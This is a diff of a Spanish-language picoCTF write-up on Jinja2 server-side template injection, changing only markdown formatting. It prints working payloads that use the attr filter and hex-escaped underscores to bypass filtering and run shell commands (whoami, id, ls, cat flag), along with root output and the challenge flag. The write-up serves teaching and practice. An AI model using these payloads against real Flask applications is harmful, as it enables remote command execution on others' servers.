@@ -92,15 +92,13 @@ Priority: u=0, i
 content=%7B%7B3*3%7D%7D
 ```
 
-%7B%7B3*3%7D%7D = { {3*3} } 
+%7B%7B3*3%7D%7D = {\{3*3}\} 
 
-Ahora busqué un payload que funcionase con esta vulnerabilidad y encontré lo que me pareción muy razonable. Pues supuestamente estaríamos haciendo que este motor ejecute instrucciones de Python, por lo que podemos intentar algo así:
+Busqué un payload que funcionase con esta vulnerabilidad y encontré lo que me pareción muy razonable. Pues supuestamente estaríamos haciendo que este motor ejecute instrucciones de Python, por lo que podemos intentar algo así:
 
 [https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-](https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-)
 
-```
-{ { request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() } }
-```
+>\{\{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() \}\}
 
 Sin embargo el la web del formulario al enviar este payload nos envía a una web con el siguente mensaje
 
@@ -136,30 +134,28 @@ Encontré un payload aún más razonable respecto a lo comenta su autor. evitar 
 En Jinja2, attr es un filtro que sirve para acceder a un atributo de un objeto de forma dinámica usando el nombre del atributo como cadena.
 Se utiliza cuando se hace uso de Jinja2 en un proyecto de esta forma. Y es la misma forma que vamos a probar para lanzar comandos.
 
-```
-{ { obj|attr('nombre_atributo') } }
-```
+\{\{ obj|attr('nombre_atributo') \}\}
 
 ## Generando un payload dirigido
-```
-{ {request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()} }
-```
+
+\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()\}\}
+
 Resultado somos root
 ```
 uid=0(root) gid=0(root) groups=0(root) 
 ```
 Buscamos la flag primero lanzando un ls
-```
-{ {request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()} }
-```
+
+\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()\}\}
+
 Encontramos el archivo flag
 ```
 __pycache__ app.py flag requirements.txt 
 ```
 Ya solo queda leer el archivo
-```
-{ {request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()} }
-```
+
+\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()\}\}
+
 ```
 picoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}
 ```
